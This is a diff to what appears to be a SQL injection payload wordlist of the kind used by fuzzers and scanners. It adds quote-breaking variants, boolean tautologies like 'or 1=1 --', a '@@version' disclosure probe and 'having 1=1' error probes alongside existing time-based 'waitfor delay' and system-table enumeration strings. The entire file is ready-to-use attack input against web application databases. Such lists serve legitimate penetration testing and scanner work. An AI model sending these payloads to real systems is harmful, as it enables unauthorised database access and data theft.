@@ -6,6 +6,7 @@
 \"
 "
 "'
+'"
 &#34
 &#39
 "' or 1=1 --
@@ -18,8 +19,8 @@
 ; / %3B
 %%2727
 %25%27
-"' or 1=1 --
-"' or 1=1 /*
+'" or 1=1 --
+'" or 1=1 /*
 '+HERP
 '||'DERP
 '+'herp
@@ -30,12 +31,17 @@ value' AND 5=5 OR 's'='0
 value' OR 5=0 OR 's'='0 
 value' AND 5=0 OR 's'='0 
 0+value
+1 AND 5=5
+1 AND 5=0
+1 OR 5=5 OR 4=0 
+1 OR 5=0 OR 4=0
 value AND 5=5
 value AND 5=0
 value OR 5=5 OR 4=0 
 value OR 5=0 OR 4=0
 WF'SQL"Probe;A--B 
 ' having 1=1--
+" having 1=1--
 1 having 1=1--
 \' having 1=1--
 ) having 1=1-- 
@@ -57,6 +63,7 @@ and 0=7659
 /**/or/**/ 7659=7659
 /**/and/**/ 7659=7659
 /**/and/** /0=7659
+' and 1 in (SELECT @@version) --
 ' and 'barfoo'= 'foobar' --
 ' or 'foobar'= 'foobar
 ' and 'foobar'= 'foobar' --
@@ -74,7 +81,6 @@ and 0=7659
 '; select @@ version,1,1,1--
 '; select * from master..sysmessages--
 '; select * from sys.dba_users--
-
 ;waitfor delay '0:0:15';--
 ;waitfor delay '0:0:15';--
 ');waitfor delay '0:0:15';--
@@ -87,7 +93,6 @@ and 0=7659
 1,'0','0','0');waitfor delay '0:0:15';--
 1','0','0','0','0');
 waitfor delay '0:0:15';--
-
 # **for insert**
 foo')--
 foo', 1)--
